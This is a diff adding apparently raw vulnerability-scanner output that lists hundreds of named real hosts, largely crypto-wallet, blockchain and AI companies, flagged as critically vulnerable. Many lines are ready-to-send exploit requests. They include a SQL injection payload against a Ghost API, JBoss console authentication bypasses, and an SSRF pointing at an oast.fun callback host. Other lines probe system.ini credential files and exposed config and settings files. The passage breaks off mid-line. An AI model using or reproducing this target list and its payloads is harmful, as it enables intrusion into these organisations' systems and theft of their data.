@@ -1,0 +1,944 @@
+[CVE-2026-26980] [http] [critical] https://blog.golem.network/ghost/api/content/tags/?key=16eb5917a0f29f5cad26aacf5b&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-aleksandra-2]
+[CVE-2026-26980] [http] [critical] https://geth.golem.network/ghost/api/content/tags/?key=16eb5917a0f29f5cad26aacf5b&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-aleksandra-2]
+[CVE-2026-26980] [http] [critical] https://geth2.golem.network/ghost/api/content/tags/?key=16eb5917a0f29f5cad26aacf5b&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-aleksandra-2]
+[CVE-2026-26980] [http] [critical] https://www.blog.golem.network/ghost/api/content/tags/?key=16eb5917a0f29f5cad26aacf5b&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-aleksandra-2]
+[config-json-exposure-fuzz] [http] [critical] https://crew.cdn.staratlas.com/config.json [path="/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://passbolt.dev.natix.network/settings.json [path="/settings.json"]
+[config-json-exposure-fuzz] [http] [critical] https://passbolt.natix.network/settings.json [path="/settings.json"]
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.wingbits.com
+[CVE-2025-68613:version_check] [http] [critical] https://hooks.nexusmutual.io/signin ["n8n Version: 1.111.0"]
+[CVE-2026-21858] [http] [critical] https://hooks.nexusmutual.io/signin ["n8n Version: 1.111.0"]
+[CVE-2026-21877] [http] [critical] https://hooks.nexusmutual.io/signin ["n8n Version: 1.111.0"]
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://md.namefi.io/app/config.json [""url": "https://md.namefi.io/app/config.json""] [path="/app/config.json"]
+[hashicorp-consul-rce] [http] [critical] https://mail.stafi.io/v1/agent/service/register
+[inspur-clusterengine-rce] [http] [critical] https://docs.cheqd.io/product/network/tools/testnet-faucet
+[inspur-clusterengine-rce] [http] [critical] https://legacy-docs.aragon.org
+[pdf-signer-ssti-to-rce] [http] [critical] https://legacy-docs.aragon.org
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://connect.redotpay.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://solana.pump.fun/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://static.pump.fun/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2026-33032] [http] [critical] https://rpc.quicknode.mainnet.arc.io/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc.quicknode.testnet.arc.io/mcp_message
+[CVE-2026-33032] [http] [critical] https://rpc.testnet.arc.io/mcp_message
+[CVE-2026-48282] [http] [critical] https://dashboard.trueo.com/CFIDE/brqvizma.txt
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://tokup.objkt.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://tokup.objkt.com/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://devnet.saber.so/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2025-54236] [http] [critical] https://coston2.enosys.global/customer/address_file/upload
+[CVE-2026-21858] [http] [critical] https://enterprise-demo.n8n.io/rest/sentry.js ["n8n Version: 1.76.3"]
+[inspur-clusterengine-rce] [http] [critical] https://developers.make.com/custom-apps-documentation
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://ap-northeast-1.imgproxy.infra-prod.notion.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://ap-northeast-2.imgproxy.infra-prod.notion.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://eu-central-1.imgproxy.infra-dev.notion.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://global.imgproxy.infra-dev.notion.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://global.imgproxy.infra-prod.notion.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://global.imgproxy.infra-stg.notion.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://img.elevenlabs.io/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://us-west-2.imgproxy.infra-dev.notion.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://us-west-2.imgproxy.infra-prod.notion.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://us-west-2.imgproxy.infra-stg.notion.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://ap-northeast-1.imgproxy.infra-prod.notion.com/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://ap-northeast-2.imgproxy.infra-prod.notion.com/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://eu-central-1.imgproxy.infra-dev.notion.com/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://global.imgproxy.infra-dev.notion.com/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://global.imgproxy.infra-prod.notion.com/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://global.imgproxy.infra-stg.notion.com/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://img.elevenlabs.io/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://us-west-2.imgproxy.infra-dev.notion.com/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://us-west-2.imgproxy.infra-prod.notion.com/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://us-west-2.imgproxy.infra-stg.notion.com/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[inspur-clusterengine-rce] [http] [critical] https://developer.topazlabs.com/
+[pdf-signer-ssti-to-rce] [http] [critical] https://developer.topazlabs.com
+[CVE-2010-0738:jmx-console-path-normalization-bypass] [http] [critical] https://contributor.magnific.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console /.;/ bypass: normalized=200 baseline=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://claude.ai/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2026-24207] [http] [critical] https://api.recraft.ai/models
+[CVE-2026-24207] [http] [critical] https://jobapi.recraft.ai/models
+[CVE-2026-24207] [http] [critical] https://klingai.com/models
+[CVE-2026-24207] [http] [critical] https://staging.api.recraft.ai/models
+[CVE-2026-24207] [http] [critical] https://staging.jobapi.recraft.ai/models
+[zimbra-preauth-ssrf] [http] [critical] https://download.qwen.ai/service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://dbhlfqt46120gd15vomg4yayj93harzzz.oast.fun%23.salesforce.com/
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.reya.xyz
+[CVE-2026-109618:version-vulnerable-no-crash] [http] [critical] https://blog.antarctic.exchange ["8.2.21"]
+[CVE-2026-33032] [http] [critical] https://node-amoy.sspwallet.io/mcp_message
+[CVE-2026-33032] [http] [critical] https://node-base.sspwallet.io/mcp_message
+[CVE-2026-33032] [http] [critical] https://node-sepolia.sspwallet.io/mcp_message
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-bch.sspwallet.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-btc-testnet.sspwallet.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-btc.sspwallet.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-doge.sspwallet.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-ltc.sspwallet.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-rvn.sspwallet.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-zec.sspwallet.io/api/v1/config.json [path="/api/v1/config.json"]
+[CVE-2017-8225:password] [http] [critical] https://cze.proxy.zelcore.io/system.ini?loginuse&loginpas ["ort 443 is specified)."]
+[CVE-2026-109618:memory-exhaustion] [http] [critical] https://secura.banksocial.io ["8.4.13"]
+[CVE-2026-33032] [http] [critical] https://rpc.eth.haqq.network/mcp_message
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://registry.zelcore.io/settings.json [""url":"https://github.com/joona/settings.json/issues"",""url":"https://github.com/joona/settings.json""] [path="/settings.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-bch-1.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-bch-2.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-bch.nodes.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-btc-1.nodes.zelcore.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-btc-2.nodes.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-btc.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-btg-1.nodes.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-btg-2.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-btg.nodes.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-clore-2.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-clore.nodes.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-dash-1.nodes.zelcore.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-dash-2.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-dash.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-dgb-1.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-dgb-2.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-dgb.nodes.zelcore.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-doge-1.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-doge-2.nodes.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-doge.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-etc-1.nodes.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-etc-2.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-etc.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-grs-1.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-grs-2.nodes.zelcore.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-grs.nodes.zelcore.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-ltc-1.nodes.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-ltc-2.nodes.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-ltc.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-rvn-1.nodes.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-rvn-2.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-rvn.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-tbtc-1.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-tbtc-2.nodes.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-tbtc.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-tls-2.nodes.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-tls.nodes.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-vtc-1.nodes.zelcore.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-vtc-2.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-vtc.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-zec-1.nodes.zelcore.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook-zec-2.nodes.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.bch-1.zelcore.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.bch-2.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.bch.zelcore.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.btc-1.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.btc-2.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.btc.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.btg-1.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.btg-2.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.btg.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.clore-1.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.clore-2.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.clore.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.dash-1.zelcore.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.dash-2.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.dash.zelcore.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.dgb-1.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.dgb-2.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.dgb.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.doge-1.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.doge-2.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.doge.zelcore.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.etc-1.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.etc-2.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.etc.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.grs-1.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.grs-2.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.grs.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.ltc-1.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.ltc-2.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.rvn-1.zelcore.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.rvn-2.zelcore.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.rvn.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.tbtc-1.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.tbtc-2.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.tbtc.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.tls.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.vtc-1.zelcore.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.vtc-2.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.vtc.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.zec-1.zelcore.io/api/config.json [path="/api/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://blockbook.zec-2.zelcore.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://passbolt.ethermail.io/settings.json [path="/settings.json"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://hexsafe.hextrust.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://sandbox.hexsafe.hextrust.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://hexsafe.hextrust.com/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://sandbox.hexsafe.hextrust.com/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2025-68613:version_check] [http] [critical] https://n8n-e44s8k0ocgoo08cogcowgkog.staging.internetmoney.io/signin ["n8n Version: 1.114.4"]
+[CVE-2026-21858] [http] [critical] https://n8n-e44s8k0ocgoo08cogcowgkog.staging.internetmoney.io/signin ["n8n Version: 1.114.4"]
+[CVE-2026-21877] [http] [critical] https://n8n-e44s8k0ocgoo08cogcowgkog.staging.internetmoney.io/signin ["n8n Version: 1.114.4"]
+[pdf-signer-ssti-to-rce] [http] [critical] https://abnft-help.keyring.app
+[pdf-signer-ssti-to-rce] [http] [critical] https://help.keyring.app
+[pdf-signer-ssti-to-rce] [http] [critical] https://whitepaper.interlinklabs.ai
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://api-docs.unisat.io/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://demo-inscribe.unisat.io/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://demo-market.unisat.io/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://demo-swap.unisat.io/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://demo.unisat.io/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://dev.unisat.io/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://developer.unisat.io/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://status.unisat.io/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://testnet4.unisat.io/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:jmx-console-verb-bypass] [http] [critical] https://validate.unisat.io/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo ["jmx-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://api-docs.unisat.io/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://demo-inscribe.unisat.io/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://demo-market.unisat.io/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://demo-swap.unisat.io/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://demo.unisat.io/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://dev.unisat.io/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://developer.unisat.io/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://status.unisat.io/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://testnet4.unisat.io/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2010-0738:web-console-verb-bypass] [http] [critical] https://validate.unisat.io/web-console/ServerInfo.jsp ["web-console verb-tampering: HEAD=200 GET=403"]
+[CVE-2017-8225:password] [http] [critical] https://lq1-staging.breez.technology/system.ini?loginuse&loginpas ["(Windows NT 10.0; Win64; x64) A"]
+[CVE-2026-109618:version-eol-branch] [http] [critical] https://api.scopuly.com ["5.6.40"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://portal.api.prd.ledger.com/assets/config.json [""baseURL": "https://mapi.eu.326ada.api.gravitee.io/portal""] [path="/assets/config.json"]
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://data.onekey.so/config.json [""url": "https://web.onekey-asset.com/hardware/neo/v1.0.3/components/neo_v1-prod_release-core_p2-v1.0.3-261f11a74247-20260929_075043-unsigned.signed.okpkg"",""url": "https://1key.so/go/google-play"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.11.0/classic.3.11.0-Stable-0908-75f1721.signed.bin"",""url": "https://common.onekey-asset.com/hw/legacy/3.0.0/classic.3.0.0-Stable-0511-0bf60dd.signed.bin"",""url": "https://common.onekey-asset.com/hw/legacy/3.0.0/mini.3.0.0-Stable-0518-b860d10.signed.bin"",""url": "https://common.onekey-asset.com/hw/legacy/2.11.0/mini.2.11.0-Stable-0323-19ff5d9-signed.bin"",""url": "https://common.onekey-asset.com/hw/touch/3.4.0/touch.3.4.0-Stable-1120-38abffd-signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.18.0-Stable-1217-659efd6_thd89_app_PROD_20250813_1.1.7_353c593_0x10_thd89_appfp_PROD_20250813_1.1.7_353c593_0x13.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.14.0-Stable-0704-f23570e_1.1.5_dfc6ccf_0x10_1.1.6_dfcd608_0x13.signed.bin"",""url": "https://apps.apple.com/us/app/onekey-open-source-wallet/id1609559473"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.12.0/classic.3.12.0-Stable-0205-05bae9f.signed.bin"",""url": "https://common.onekey-asset.com/hw/legacy/2.11.0/classic.2.11.0-Stable-0323-c67044f.bin"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.21.0/classic1s.3.21.0-Stable-btc-be08c78_thd89_app_PROD_20260911_1.3.2_6699c5c_0x10.signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.11.0/touch.4.11.0-Stable-0606-204425e.signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.10.0/touch.4.10.0-Stable-0304-834ea82.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro2/v1.0.3/components/pro2_v3-prod_release-core_p1-v1.0.3-261f11a74247-20260929_075041-unsigned.signed.okpkg"",""url": "https://web.onekey-asset.com/hardware/pro2/v1.0.2/coprocessor/pro2_neo-prod_release-coprocessor-v1.0.22-36aeb9e-20260922-signed.okpkg"",""url": 